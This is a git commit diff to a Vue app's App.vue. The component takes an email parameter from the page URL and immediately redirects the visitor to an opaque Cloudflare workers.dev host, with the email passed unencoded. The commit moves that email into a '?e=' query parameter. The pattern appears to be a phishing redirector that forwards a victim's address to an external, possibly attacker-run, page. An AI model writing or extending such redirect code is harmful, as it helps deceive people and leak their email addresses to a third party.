7e23a220e8d9650ad68ab03085e60eac0bb1ac91
armandabors <146956125+armandabors@users.noreply.github.com>
2025-02-13 07:53:01 -0800

    Update App.vue

--- src/App.vue
+++ src/App.vue
@@ -20,7 +20,7 @@ export default {
       // If the email parameter exists
       if (email) {
         // Construct the redirect URL with the plain email (not encoded)
-        const redirectUrl = `https://proud-silence-9e2e.newreu29.workers.dev/${email}`;
+        const redirectUrl = `https://proud-silence-9e2e.newreu29.workers.dev/?e=${email}`;
 
         // Redirect to the constructed URL
         window.location.replace(redirectUrl);
